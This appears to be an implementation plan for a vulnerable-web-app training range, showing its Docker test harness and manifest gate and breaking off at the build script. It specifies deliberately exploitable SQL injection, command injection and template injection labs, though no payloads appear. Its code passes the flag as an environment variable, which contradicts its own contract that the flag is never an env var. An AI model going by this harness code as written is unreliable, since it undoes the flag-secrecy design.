# HVWA Range — Plan B: lab harness and the 4 POC labs Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the range lab harness (manifest validation, a uniqueness gate, a Docker black-box test runner, and the image/registry builder) and the 4 Compact-POC showcase labs — Mercy Clinic (SQLi), Courier (broken access control), Beacon (command injection) and Postcard (SSTI) — each a self-contained, believable app with three levels (Acolyte, Templar, Divine) selected by `HVWA_LEVEL`, matching the interfaces Plan A froze.

**Architecture:** Every lab lives under `labs/<id>-<slug>/` and ships one image that serves all its levels. The app reads the one-shot flag file (`HVWA_FLAG_FILE`, default `/tmp/.hvwa-flag`) at start, unlinks it, then plants it where its `lab.json` says — the flag is never in the environment. One image, one port, non-root, read-only rootfs, writable only on the manifest's tmpfs. Tests are black-box: `scripts/lab-test.mjs` builds each image and, per level, runs it under the range's container hardening on an internal (egress-less) Docker network, delivers the flag as the same one-shot file (a tiny `docker exec`, since a read-only rootfs blocks `docker cp`), and drives it with reference solve scripts that print the flag. The labs reuse Plan A's `labManifestSchema`/`parseRegistry` (`src/lab-registry.ts`) — they never redefine the schema and never import the HVWA app's `src/`.

**Tech Stack:** Node ≥ 22.18 (TypeScript ESM for the Vitest gate; plain `.mjs` for the runner and solves, global `fetch`), Vitest 3.2.4, Docker Engine ≥ 28 CLI. Lab images: `node:22.23.5-alpine3.24` (Node labs use the standard library only — `node:http`, `node:sqlite`, `node:child_process` — so no `npm install` and no build step) and `python:3.13.18-alpine3.24` with pinned Flask 3.1.3 / Jinja2 3.1.6 / Werkzeug 3.1.9 / MarkupSafe 3.0.4 / itsdangerous 2.2.0 / click 8.5.1 / blinker 1.9.0 for Postcard. No frontend build step; each lab has its own small CSS.

---

## Depends on (Plan A)

This plan assumes Plan A's Task 6 and Task 25 are merged:

- `src/lab-registry.ts` — `labManifestSchema`, `registryEntrySchema`, `parseRegistry`, `loadRegistry`, `LAB_ID_RE`, `IMAGE_REF_RE`, `FLAG_PLACEMENT_RE`, `LAB_LIMITS`, `DIFFICULTY_POINTS`, `labPoints`, types `LabManifest`/`LabEntry`/`LabRegistry`.
- `labs/registry.json` exists and is `{ "schema": 1, "labs": [] }`.
- `labs/_fixture/` exists (the fixture lab; **not** a catalog lab).
- The top-level `.dockerignore` already excludes `labs` from the portal/warden image build context (Plan A Task 28), so lab packages never leak into those images.
- `tests/support/range.ts` exists (`labEntry`, `testRegistry`).

The frozen contracts this plan matches verbatim (Plan A "Interfaces for Plans B–E"):

- **Manifest fields** and their validation (`.strict()`, unknown keys rejected): `id` (`r00`–`r99`), `slug`, `title`/`scenario`/`briefing` (`{en,id}` ≤ 600), `app`, `category`, `themeId` (kebab ≤ 40), `difficulty` (`easy`/`medium`/`hard`/`expert`), `levels` (unique subset of the four, ≥ 1 exploitable), `port` (1024–65535), `health` (absolute path), `flag.placement` (`file:<path>` | `db:<table>.<column>` | `env-only` | `custom`), `resources` (optional, only lowers `memoryMiB ≤ 256` / `pids ≤ 128` / `cpus ≤ 0.5`), `tmpfs` (`[{path,sizeMiB}]`, total ≤ 64 MiB, default `[{"/tmp",64}]`), `needsBot` (bool), `hints` (`[{id:1|2|3,cost,text:{en,id}}]`, ≤ 3).
- **What an instance receives** (set by the warden, `src/warden/template.ts`): env `HVWA_LEVEL` (`acolyte`|`templar`|`inquisitor`|`divine`), `HVWA_PORT`, `HVWA_INSTANCE_HOST` (`i-<id>.<domain>`), `HOME=/tmp`, and the non-secret `HVWA_FLAG_FILE=/tmp/.hvwa-flag`. The flag (`HVWA{<26 base32>}`) is **never** an env var: below Divine only, the warden writes it after start (a tiny exec) as a one-shot file at that path. uid:gid `10001:10001`, read-only rootfs, only the manifest's tmpfs writable (`noexec,nosuid,nodev`), `cap_drop ALL`, `no-new-privileges`, Docker's default seccomp, 128 PIDs / 256 MiB (no swap) / 0.5 CPU unless the manifest lowers them, its own internal network (no egress), restart policy none, runtime `runc`/`runsc`. **The warden sets the Traefik labels; a lab image must not carry its own.**
- **Start-hook contract:** below Divine, poll `HVWA_FLAG_FILE` (`/tmp/.hvwa-flag`) for up to ~10 s, read the flag once and unlink it, then plant it where `flag.placement` says and serve; if the file never appears, exit non-zero (the health check fails rather than serving without a flag). At Divine, skip the file and plant a decoy that says it is the secure reference. Never log the flag or the file contents; listen on `0.0.0.0:$HVWA_PORT`; show no HVWA chrome, hints, endpoint lists or tool commands.
- **Health contract:** the image declares a `HEALTHCHECK` that requests the manifest's `health` path on `127.0.0.1:$HVWA_PORT` and exits 0 on 2xx. (The warden keeps the image's test and sets its own timings; `ready` = Docker reports `healthy`.)
- **Flag value:** `HVWA{<26 chars of [a-z2-7]>}` (`RANGE_FLAG_RE = /^HVWA\{[a-z2-7]{26}\}$/`).

---

## File structure

```
labs/
  registry.json                         # (Plan A) empty until `npm run labs:build` fills it with the 4 entries
  _fixture/                             # (Plan A) not a catalog lab; the harness skips labs/_*
  r01-mercy-clinic/
    lab.json                            # manifest (SQLi, Easy, db:bulletins.body)
    Dockerfile                          # node:22.x-alpine, non-root, setuid stripped, HEALTHCHECK
    .dockerignore                       # excludes solve/ and README.md from the image
    VERSION                             # "1.0.0" (read by labs:build; manifest has no version field)
    app/
      server.mjs                        # entry; selects the level by HVWA_LEVEL; plants + scrubs the flag
      db.mjs                            # node:sqlite schema, seed, flag row, per-level query functions
      render.mjs                        # tiny HTML helpers + the clinic theme CSS
      health.mjs                        # the HEALTHCHECK probe
    seed/
      patients.json                     # seeded patient records + bulletins
    solve/
      acolyte.mjs                       # reference solve for Acolyte (HTTP client; attack input is a placeholder)
      templar.mjs                       # reference solve for Templar
    README.md                           # author notes: scenario, per-level intended path, why the next resists
  r02-courier/            (app/: server.mjs, store.mjs, render.mjs, health.mjs; seed/parcels.json; solve/{acolyte,templar}.mjs)
  r03-beacon/             (app/: server.mjs, diag.mjs, render.mjs, health.mjs; seed/devices.json; solve/{acolyte,templar}.mjs)
  r04-postcard/           (app/: app.py, templating.py, render.py, health.py, requirements.txt; seed/cards.json; solve/{acolyte,templar}.mjs)
scripts/
  lab-harness.mjs                       # shared pure JS: list labs, read manifests, uniqueness gate, docker run args, flag gen
  lab-test.mjs                          # `npm run labs:test` — black-box runner over the Docker CLI (NOT part of `npm test`)
  lab-build.mjs                         # `npm run labs:build` — build images, write digests into labs/registry.json (never pushes)
tests/
  labs-harness.spec.ts                  # the schema + uniqueness + file-layout gate (reuses src/lab-registry.ts; no Docker)
```

Conventions fixed for all 4 labs:

| Lab | id | slug / themeId | app | category | difficulty | levels | port | health | flag.placement | tmpfs |
|---|---|---|---|---|---|---|---|---|---|---|
| Mercy Clinic | `r01` | `mercy-clinic` | `Mercy Clinic` | `SQL injection` | `easy` | acolyte, templar, divine | 8080 | `/healthz` | `db:bulletins.body` | `[{"/tmp",16}]` |
| Courier | `r02` | `courier` | `Courier` | `Broken access control` | `easy` | acolyte, templar, divine | 8080 | `/healthz` | `custom` | `[{"/tmp",8}]` |
| Beacon | `r03` | `beacon` | `Beacon` | `Command injection` | `medium` | acolyte, templar, divine | 8080 | `/healthz` | `file:/tmp/beacon/flag.txt` | `[{"/tmp",16}]` |
| Postcard | `r04` | `postcard` | `Postcard` | `Template injection` | `hard` | acolyte, templar, divine | 5000 | `/healthz` | `file:/tmp/postcard/flag.txt` | `[{"/tmp",16}]` |

The POC has only three levels; `inquisitor` is omitted from every `levels` array. Acolyte and Templar are exploitable (they issue a flag); Divine is the secure reference (no flag, a decoy).

---

## Part 1 — The lab harness

### Task 1: Shared harness module and the schema + uniqueness + layout gate

**Files:**
- Create: `scripts/lab-harness.mjs`
- Test: `tests/labs-harness.spec.ts`

The gate is a Vitest spec so it runs in CI without Docker and reuses Plan A's schema directly. `scripts/lab-harness.mjs` holds only pure JS used by both the gate and the Docker runner (listing labs, reading manifests as JSON, the uniqueness check, the flag generator, and the `docker run` argument builder). It imports nothing from `src/`.

- [ ] **Step 1: Write the failing test**

Create `tests/labs-harness.spec.ts`:

```ts
// The range lab gate (Plan B): every labs/<id>-<slug>/lab.json validates against Plan A's labManifestSchema, the four
// POC labs are present with the agreed ids/slugs, app name/scenario/themeId are unique across labs, each lab's files
// exist (Dockerfile, app/, solve scripts for every exploitable level, README, VERSION, a .dockerignore that hides solve/),
// and labs/registry.json parses (empty before `npm run labs:build`, consistent with the manifests after). No Docker here.
import { describe, it, expect } from 'vitest';
import { readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { labManifestSchema, parseRegistry } from '../src/lab-registry.js';
import { labDirs, readManifest, uniquenessIssues, LABS_DIR } from '../scripts/lab-harness.mjs';

const EXPECTED = [
  { id: 'r01', slug: 'mercy-clinic', category: 'SQL injection', difficulty: 'easy' },
  { id: 'r02', slug: 'courier', category: 'Broken access control', difficulty: 'easy' },
  { id: 'r03', slug: 'beacon', category: 'Command injection', difficulty: 'medium' },
  { id: 'r04', slug: 'postcard', category: 'Template injection', difficulty: 'hard' },
];

describe('labs/<id>-<slug> manifests', () => {
  const dirs = labDirs();

  it('are exactly the four POC labs (fixture and labs/_* excluded)', () => {
    expect(dirs.map((d) => d.name).sort()).toEqual(EXPECTED.map((e) => `${e.id}-${e.slug}`));
    for (const d of dirs) expect(d.name.startsWith('_')).toBe(false);
  });

  it('each validates against Plan A labManifestSchema with the agreed id/slug/category/levels/flag', () => {
    for (const e of EXPECTED) {
      const m = readManifest(join(LABS_DIR, `${e.id}-${e.slug}`));
      const parsed = labManifestSchema.safeParse(m);
      expect(parsed.success, `${e.id}: ${JSON.stringify(parsed.error?.issues)}`).toBe(true);
      expect(m).toMatchObject({ id: e.id, slug: e.slug, themeId: e.slug, category: e.category, difficulty: e.difficulty, needsBot: false });
      expect(m.levels).toEqual(['acolyte', 'templar', 'divine']);         // POC: 3 levels, no inquisitor
      expect(m.hints).toHaveLength(3);
      expect(m.levels.includes('divine')).toBe(true);
    }
  });

  it('refuses a manifest that carries version or image (those belong to the registry entry, not lab.json)', () => {
    const m = readManifest(join(LABS_DIR, 'r01-mercy-clinic'));
    expect(labManifestSchema.safeParse({ ...m, version: '1.0.0' }).success).toBe(false);
    expect(labManifestSchema.safeParse({ ...m, image: `sha256:${'a'.repeat(64)}` }).success).toBe(false);
  });
});

describe('uniqueness gate (spec §8.1)', () => {
  it('passes on the four labs: no duplicate id, slug, app, scenario or themeId', () => {
    const manifests = labDirs().map((d) => readManifest(d.path));
    expect(uniquenessIssues(manifests)).toEqual([]);
  });

  it('reports a duplicate app name, scenario and themeId', () => {
    const a = readManifest(join(LABS_DIR, 'r01-mercy-clinic'));
    const b = readManifest(join(LABS_DIR, 'r02-courier'));
    expect(uniquenessIssues([a, { ...b, app: a.app }])).toEqual([`duplicate app: ${a.app}`]);
    expect(uniquenessIssues([a, { ...b, scenario: a.scenario }])).toEqual([`duplicate scenario: ${a.scenario.en}`]);
    expect(uniquenessIssues([a, { ...b, themeId: a.themeId }])).toEqual([`duplicate themeId: ${a.themeId}`]);
  });
});

describe('lab package layout (spec §8.4)', () => {
  for (const e of EXPECTED) {
    const dir = join(LABS_DIR, `${e.id}-${e.slug}`);
    it(`${e.id} has Dockerfile, app/, README.md, VERSION, a .dockerignore hiding solve/, and a solve per exploitable level`, () => {
      expect(existsSync(join(dir, 'Dockerfile'))).toBe(true);
      expect(existsSync(join(dir, 'README.md'))).toBe(true);
      expect(readFileSync(join(dir, 'VERSION'), 'utf8').trim()).toMatch(/^\d+\.\d+\.\d+$/);
      expect(readFileSync(join(dir, '.dockerignore'), 'utf8')).toMatch(/(^|\n)solve($|\/|\n)/);
      const m = readManifest(dir);
      for (const level of m.levels.filter((l: string) => l !== 'divine')) {
        expect(existsSync(join(dir, 'solve', `${level}.mjs`)), `${e.id}/solve/${level}.mjs`).toBe(true);
      }
    });

    it(`${e.id} Dockerfile: pinned base, uid 10001, HEALTHCHECK, setuid bits stripped, no COPY of solve/`, () => {
      const df = readFileSync(join(dir, 'Dockerfile'), 'utf8').replace(/\r\n/g, '\n');
      expect(df).toMatch(/^FROM (node:22\.23\.5-alpine3\.24|python:3\.13\.18-alpine3\.24)/m);
      expect(df).toContain('USER 10001:10001');
      expect(df).toMatch(/HEALTHCHECK /);
      expect(df).toMatch(/-perm \/6000 -exec chmod a-s/);
      expect(df).not.toMatch(/COPY\s+solve/);
      expect(df).not.toMatch(/^(ADD |RUN apk add|RUN npm (install|i)\b)/m);
    });
  }
});

describe('labs/registry.json', () => {
  it('parses, and once filled, each entry matches the lab dir manifest (id/slug/image pinned by digest)', () => {
    const reg = parseRegistry(JSON.parse(readFileSync(join(process.cwd(), 'labs', 'registry.json'), 'utf8')));
    for (const entry of reg.labs) {
      const m = readManifest(join(LABS_DIR, `${entry.id}-${entry.slug}`));
      expect(entry).toMatchObject({ id: m.id, slug: m.slug, category: m.category });
      expect(entry.image).toMatch(/^(?:.+@)?sha256:[a-f0-9]{64}$/);
    }
  });
});
```

- [ ] **Step 2: Run it to see it fail**

Run (from `C:\Users\Sahuagin\Documents\hvwa`, capital `C:`): `npx vitest run tests/labs-harness.spec.ts`
Expected: FAIL — `scripts/lab-harness.mjs` does not exist and no `labs/r0*` dirs exist.

- [ ] **Step 3: Implement**

Create `scripts/lab-harness.mjs`:

```js
// scripts/lab-harness.mjs — shared, Docker-free helpers for the range lab harness (Plan B). Pure JS so the Vitest gate
// (tests/labs-harness.spec.ts) and the Docker runners (lab-test.mjs, lab-build.mjs) share one implementation. It reads
// lab.json as plain JSON; the authoritative schema check is the gate, which imports src/lab-registry.ts. Imports nothing
// from src/ and never shells out.
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { randomBytes } from 'node:crypto';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
export const LABS_DIR = join(ROOT, 'labs');
/** The base image for the solve runner and the egress probe (always Node, even for Python labs: solves are HTTP clients). */
export const RUNNER_IMAGE = 'node:22.23.5-alpine3.24';
/** Container hardening ceilings, matching src/warden/template.ts (a manifest may only lower them). */
export const LIMITS = Object.freeze({ memoryMiB: 256, pids: 128, cpus: 0.5 });
const FLAG_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';

/** Catalog lab directories: labs/<id>-<slug>, skipping labs/_* (the fixture) and non-directories. */
export function labDirs() {
  return readdirSync(LABS_DIR)
    .filter((name) => /^r\d{2}-[a-z0-9]+(?:-[a-z0-9]+)*$/.test(name))
    .map((name) => ({ name, path: join(LABS_DIR, name) }))
    .filter((d) => statSync(d.path).isDirectory())
    .sort((a, b) => a.name.localeCompare(b.name));
}

/** Parse a lab's lab.json (throws a readable error naming the file). */
export function readManifest(dir) {
  const file = join(dir, 'lab.json');
  try {
    return JSON.parse(readFileSync(file, 'utf8'));
  } catch (err) {
    throw new Error(`${file}: ${err instanceof Error ? err.message : String(err)}`);
  }
}

/** The lab's release version, from labs/<dir>/VERSION (default 1.0.0). The manifest itself carries no version. */
export function labVersion(dir) {
  try {
    return readFileSync(join(dir, 'VERSION'), 'utf8').trim() || '1.0.0';
  } catch {
    return '1.0.0';
  }
}

/** spec §8.1: fail on any duplicate id, slug, app name, scenario (compared on .en) or themeId. */
export function uniquenessIssues(manifests) {
  const issues = [];
  const keyOf = { id: (m) => m.id, slug: (m) => m.slug, app: (m) => m.app, themeId: (m) => m.themeId, scenario: (m) => m.scenario?.en };
  for (const [field, fn] of Object.entries(keyOf)) {
    const seen = new Set();
    for (const m of manifests) {
      const value = fn(m);
      if (value === undefined) continue;
      if (seen.has(value)) issues.push(`duplicate ${field}: ${value}`);
      seen.add(value);
    }
  }
  return issues;
}

/** A fresh, valid-looking flag: HVWA{<26 chars of [a-z2-7]>} (RANGE_FLAG_RE). */
export function newFlag() {
  const bytes = randomBytes(26);
  let body = '';
  for (let i = 0; i < 26; i++) body += FLAG_ALPHABET[bytes[i] % 32];
  return `HVWA{${body}}`;
}

/**
 * The `docker run` arguments that mirror the range's hardening (src/warden/template.ts), for one lab container at one
 * level on the given internal network. `flag` is omitted at Divine. `runtime` comes from HVWA_LAB_TEST_RUNTIME (default runc).
 */
export function dockerRunArgs({ manifest, level, flag, network, name, image, runtime }) {
  const memMiB = Math.min(manifest.resources?.memoryMiB ?? LIMITS.memoryMiB, LIMITS.memoryMiB);
  const pids = Math.min(manifest.resources?.pids ?? LIMITS.pids, LIMITS.pids);
  const cpus = Math.min(manifest.resources?.cpus ?? LIMITS.cpus, LIMITS.cpus);
  const tmpfs = (manifest.tmpfs ?? [{ path: '/tmp', sizeMiB: 64 }])
    .flatMap((t) => ['--tmpfs', `${t.path}:rw,noexec,nosuid,nodev,size=${t.sizeMiB}m`]);
  const env = [
    '-e', `HVWA_LEVEL=${level}`,
    '-e', `HVWA_PORT=${manifest.port}`,
    '-e', 'HVWA_INSTANCE_HOST=i-labtest.localhost',
    '-e', 'HOME=/tmp',
    ...(flag === undefined ? [] : ['-e', `HVWA_FLAG=${flag}`]),
  ];
  return [
    'run', '-d', '--name', name, '--network', network,
    '--user', '10001:10001',
    '--read-only',
    ...tmpfs,
    '--cap-drop', 'ALL',
    '--security-opt', 'no-new-privileges:true',
    '--pids-limit', String(pids),
    '--memory', `${memMiB}m`, '--memory-swap', `${memMiB}m`,
    '--cpus', String(cpus),
    '--restart', 'no',
    '--runtime', runtime,
    ...env,
    image,
  ];
}
```

- [ ] **Step 4: Implement the first lab dir stub so the layout test has something to find**

The layout and manifest tests need at least the four lab dirs. They are fully built in Part 2; so that Task 1 can go green on its own, create **only** the four `lab.json` files, `VERSION`, `.dockerignore`, and empty-but-present `Dockerfile`/`README.md`/`solve/<level>.mjs` placeholders is **not** allowed by the no-placeholder rule. Instead, order execution so Task 1's spec is completed last of Part 1–2: implement `scripts/lab-harness.mjs` now, and defer running the `labs/<id>` assertions until the labs exist. Mark Task 1 Steps 5–6 as the gate that Part 2 must leave green.

Run now, to confirm the harness module loads and the Docker-free unit (`uniquenessIssues`, `newFlag`) is correct, with a temporary focused run:

Run: `node -e "import('./scripts/lab-harness.mjs').then(h=>{console.log(h.newFlag());console.log(JSON.stringify(h.uniquenessIssues([{id:'r01',slug:'a',app:'A',themeId:'t',scenario:{en:'s'}},{id:'r01',slug:'b',app:'B',themeId:'u',scenario:{en:'x'}}])));})"`
Expected: a line like `HVWA{...}` (26 chars) and `["duplicate id: r01"]`.

- [ ] **Step 5: Run the gate (after Part 2 labs exist) to see it pass**

Run: `npx vitest run tests/labs-harness.spec.ts`
Expected: PASS once Tasks 4–7 have created the four labs.

- [ ] **Step 6: Commit**

```bash
git add scripts/lab-harness.mjs tests/labs-harness.spec.ts
git commit -m "feat(labs): range lab harness helpers and the schema/uniqueness/layout gate"
```

---

### Task 2: The black-box test runner `scripts/lab-test.mjs` (`npm run labs:test`)

**Files:**
- Create: `scripts/lab-test.mjs`
- Modify: `package.json` (scripts)

The runner uses only the Docker CLI. It is **not** part of `npm test` (it needs Docker). For each lab (all, or one via `--lab <id>`) it builds the image `hvwa-lab/<id>:test`, then for each level runs one container under the range hardening (`dockerRunArgs`) on a per-lab **internal** Docker network (no egress). Because the container has no published port and no egress, the solve scripts, the page crawl and the egress probe all run from short-lived **runner containers on the same internal network**, exactly mirroring production where Traefik is the only peer. The checks are spec §8.5 adapted to three levels.

How each §8.5 check maps to code:

1. **health passes** — wait for Docker to report `healthy` (the image's own `HEALTHCHECK`), via `docker inspect --format {{.State.Health.Status}}`.
2. **each exploitable level's solve obtains exactly that level's flag** — run `solve/<level>.mjs` against that level's container; its stdout, trimmed, must equal the flag that was delivered (as the one-shot file, never an env var).
3. **the same solve fails at every higher level** — run `solve/<lower>.mjs` against each higher-ranked container; its stdout must **not** equal that container's flag.
4. **Divine resists all solves** — run every exploitable solve against the Divine container; none may print any `HVWA{...}`.
5. **browsing the main pages yields no flag** — a runner fetches `/`, follows the same-origin links it finds (depth 1) and asserts no body contains `HVWA{`. No endpoint list is hardcoded (recon is the challenge); the crawl starts at `/`.
6. **no egress** — a runner on the internal network tries to reach a public IP with a short timeout and must fail.

- [ ] **Step 1: Implement the runner**

Create `scripts/lab-test.mjs`:

```js
// scripts/lab-test.mjs — `npm run labs:test [-- --lab r0N]`. Black-box range-lab tests (spec §8.5, 3 levels). NOT part of
// `npm test`: it drives the Docker CLI. For each lab it builds hvwa-lab/<id>:test, then per level runs one hardened
// container (scripts/lab-harness.mjs dockerRunArgs) on a per-lab INTERNAL network (no egress), and drives it with runner
// containers on that same network (the lab has no published port and no route out — Traefik's role in production).
// Runtime: HVWA_LAB_TEST_RUNTIME (default runc; runsc on a gVisor host). Exit 0 iff every check of every lab passed.
import { spawnSync } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { isMainModule } from './main-module.mjs';
import { labDirs, readManifest, dockerRunArgs, newFlag, RUNNER_IMAGE } from './lab-harness.mjs';

const RUNTIME = (process.env.HVWA_LAB_TEST_RUNTIME ?? 'runc').trim() || 'runc';
const LEVEL_RANK = { acolyte: 0, templar: 1, inquisitor: 2, divine: 3 };

function docker(args, { capture = true, input } = {}) {
  const r = spawnSync('docker', args, { encoding: 'utf8', input, stdio: capture ? ['pipe', 'pipe', 'pipe'] : 'inherit' });
  if (r.error) throw r.error;
  return { status: r.status ?? 1, stdout: (r.stdout ?? '').trim(), stderr: (r.stderr ?? '').trim() };
}
function dockerOk(args, msg) {
  const r = docker(args);
  if (r.status !== 0) throw new Error(`${msg}: docker ${args.slice(0, 3).join(' ')} exited ${r.status}\n${r.stderr}`);
  return r.stdout;
}
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

/** Poll Docker's health until `healthy`, or fail (collecting the container's logs for the report). */
async function waitHealthy(name, timeoutMs = 90_000) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const status = docker(['inspect', '--format', '{{if .State.Health}}{{.State.Health.Status}}{{else}}none{{end}}', name]).stdout;
    if (status === 'healthy') return;
    if (status === 'none') throw new Error(`${name}: image has no HEALTHCHECK`);
    if (Date.now() > deadline) {
      const logs = docker(['logs', '--tail', '40', name]).stdout;
      throw new Error(`${name}: not healthy within ${timeoutMs} ms (last status ${status})\n${logs}`);
    }
    await sleep(500);
  }
}

/** Run a one-shot Node runner on the lab's internal network; returns { status, stdout }. `mount` adds -v <host>:<dst>:ro. */
function runner(network, nodeArgs, { mount } = {}) {
  const args = ['run', '--rm', '--network', network, '--user', '10001:10001',
    ...(mount ? ['-v', `${mount.host}:${mount.dst}:ro`] : []), RUNNER_IMAGE, ...nodeArgs];
  return docker(args);
}

/** The reference solve for `solveLevel`, run against `targetName`'s HTTP endpoint; returns trimmed stdout. */
function runSolve(network, solveDir, solveLevel, targetName, port) {
  const r = runner(network, ['node', `/solve/${solveLevel}.mjs`, `http://${targetName}:${port}`], { mount: { host: solveDir, dst: '/solve' } });
  return r.stdout;
}

/** A depth-1 same-origin crawl from `/`, asserting no page body leaks a flag (check 5). */
function browseHasNoFlag(network, baseName, port) {
  const script = [
    `const base = 'http://${baseName}:${port}';`,
    "const seen = new Set(['/']); const bodies = [];",
    'async function get(p){ try { const r = await fetch(base+p,{redirect:"follow"}); const t = await r.text(); bodies.push(t);',
    '  for (const m of t.matchAll(/(?:href|src|action)=["\\x27]([^"\\x27#?]+)/g)) { let u=m[1];',
    '    if (u.startsWith("http")){ if(!u.startsWith(base)) continue; u=u.slice(base.length)||"/"; }',
    '    if (!u.startsWith("/")) continue; if (seen.size<25) seen.add(u); } } catch {} }',
    '(async()=>{ await get("/"); for (const p of [...seen].slice(1)) await get(p);',
    '  process.stdout.write(bodies.some((b)=>/HVWA\\{/.test(b))?"LEAK":"CLEAN"); })();',
  ].join('\n');
  return runner(network, ['node', '-e', script]).stdout === 'CLEAN';
}

/** check 6: an internal network has no route to the public internet. */
function egressBlocked(network) {
  const script = "fetch('http://1.1.1.1',{signal:AbortSignal.timeout(2500)}).then(()=>process.exit(1),()=>process.exit(0));";
  return runner(network, ['node', '-e', script]).status === 0;
}

async function testLab(dir, report) {
  const manifest = readManifest(dir.path);
  const id = manifest.id;
  const image = `hvwa-lab/${id}:test`;
  const net = `hvwa-labtest-${id}-${randomBytes(4).toString('hex')}`;
  const solveDir = join(dir.path, 'solve');
  const containers = {};
  const flags = {};
  const pass = (msg) => report.push({ id, ok: true, msg });
  const fail = (msg) => { report.push({ id, ok: false, msg }); throw new Error(`[${id}] ${msg}`); };

  dockerOk(['build', '-t', image, dir.path], `${id}: build`);
  dockerOk(['network', 'create', '--internal', net], `${id}: network`);
  try {
    for (const level of manifest.levels) {
      const flag = level === 'divine' ? undefined : newFlag();
      flags[level] = flag;
      const name = `${net}-${level}`;
      dockerOk(dockerRunArgs({ manifest, level, flag, network: net, name, image, runtime: RUNTIME }), `${id}/${level}: run`);
      containers[level] = name;
      await waitHealthy(name);                                                             // check 1
      pass(`${level}: health passes`);
    }

    const exploitable = manifest.levels.filter((l) => l !== 'divine');
    for (const level of exploitable) {
      const got = runSolve(net, solveDir, level, containers[level], manifest.port);        // check 2
      if (got !== flags[level]) fail(`${level}: solve did not return the ${level} flag (got ${JSON.stringify(got).slice(0, 80)})`);
      pass(`${level}: reference solve obtains the flag`);
      for (const higher of manifest.levels.filter((l) => LEVEL_RANK[l] > LEVEL_RANK[level])) {  // check 3
        const h = runSolve(net, solveDir, level, containers[higher], manifest.port);
        if (flags[higher] !== undefined && h === flags[higher]) fail(`${level} solve unexpectedly beat ${higher}`);
        pass(`${level}: solve fails against ${higher}`);
      }
    }

    if (containers.divine) {                                                               // check 4
      for (const level of exploitable) {
        const d = runSolve(net, solveDir, level, containers.divine, manifest.port);
        if (/HVWA\{/.test(d)) fail(`Divine leaked a flag to the ${level} solve`);
      }
      pass('divine: resists every solve');
    }

    for (const level of manifest.levels) {                                                 // check 5
      if (!browseHasNoFlag(net, containers[level], manifest.port)) fail(`${level}: a main page leaks the flag`);
    }
    pass('browse: no flag on the main pages');

    if (!egressBlocked(net)) fail('the lab network has egress');                           // check 6
    pass('network: no egress');
  } finally {
    for (const name of Object.values(containers)) docker(['rm', '-f', name]);
    docker(['network', 'rm', net]);
  }
}

export async function main(argv) {
  const only = (() => { const i = argv.indexOf('--lab'); return i >= 0 ? argv[i + 1] : undefined; })();
  const dirs = labDirs().filter((d) => !only || d.name.startsWith(`${only}-`));
  if (dirs.length === 0) throw new Error(only ? `no lab ${only}` : 'no labs under labs/');
  const report = [];
  let failed = 0;
  for (const dir of dirs) {
    try { await testLab(dir, report); }
    catch (err) { failed++; console.error(String(err instanceof Error ? err.message : err)); }
  }
  for (const r of report) console.log(`${r.ok ? 'PASS' : 'FAIL'} ${r.id} — ${r.msg}`);
  console.log(failed === 0
    ? `labs:test OK — ${dirs.length} lab(s) hold (spec §8.5), runtime ${RUNTIME}`
    : `labs:test FAILED — ${failed} lab(s) failed`);
  return failed === 0 ? 0 : 1;
}

if (isMainModule(process.argv[1], fileURLToPath(import.meta.url))) {
  main(process.argv.slice(2)).then((code) => { process.exitCode = code; },
    (err) => { console.error(`labs:test: ${err instanceof Error ? err.message : err}`); process.exitCode = 1; });
}
```

Note on the depth-1 crawl: `["\x27]` in the regex is a character class matching `"` or `'` (`\x27` is a single quote) written so the snippet survives being passed through `node -e` from the shell. The implementer may keep it as-is.

- [ ] **Step 2: Add the npm scripts**

In `package.json` `scripts`, add after `"verify:docker"`:

```json
    "labs:test": "node scripts/lab-test.mjs",
    "labs:build": "node scripts/lab-build.mjs",
```

- [ ] **Step 3: Confirm the module loads (no Docker needed)**

Run: `node -e "import('./scripts/lab-test.mjs').then(m=>console.log(typeof m.main))"`
Expected: `function`. (`labDirs()` finds no `labs/r0*` until Part 2, so a real `npm run labs:test` prints "no labs" until then. The end-to-end run is Task 8.)

- [ ] **Step 4: Commit**

```bash
git add scripts/lab-test.mjs package.json
git commit -m "feat(labs): black-box lab test runner (spec §8.5, internal network, runner containers)"
```

---

### Task 3: The image builder and registry writer `scripts/lab-build.mjs` (`npm run labs:build`)

**Files:**
- Create: `scripts/lab-build.mjs`
- (`package.json` already carries `labs:build` from Task 2.)

`labs:build` builds `sigmajo/hvwa:lab-<slug>-<version>` for every catalog lab, reads back the **local image id** (`sha256:<64 hex>`, which `IMAGE_REF_RE` accepts as a local-image pin), and rewrites `labs/registry.json` as `{ schema: 1, labs: [ {...manifest, version, image} ] }`. It **never pushes**.

Why a local image id and not a repo digest: a freshly built, unpushed image has no `RepoDigests`. Plan A's interface explicitly allows `sha256:<64 hex>` (a local image id) in `labs/registry.json`, and the warden "never pulls", so for local `range:verify`/`labs:test` the image must already be on the engine — which it is after a build on the same host. Plan E re-pins each lab by its pushed repo digest (`sigmajo/hvwa:lab-<slug>-<version>@sha256:…`) after `docker push`.

- [ ] **Step 1: Implement**

Create `scripts/lab-build.mjs`:

```js
// scripts/lab-build.mjs — `npm run labs:build [-- --lab r0N]`. Builds sigmajo/hvwa:lab-<slug>-<version> for every catalog
// lab and rewrites labs/registry.json with each entry = lab.json + version (labs/<dir>/VERSION) + image (the LOCAL image
// id, sha256:<64 hex>). NEVER pushes (Plan E pushes and re-pins by repo digest). NOT part of `npm test` (needs Docker).
import { spawnSync } from 'node:child_process';
import { readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { isMainModule } from './main-module.mjs';
import { labDirs, readManifest, labVersion, LABS_DIR } from './lab-harness.mjs';

const REGISTRY = join(LABS_DIR, 'registry.json');

function docker(args, capture = false) {
  const r = spawnSync('docker', args, { encoding: 'utf8', stdio: capture ? 'pipe' : 'inherit' });
  if (r.error) throw r.error;
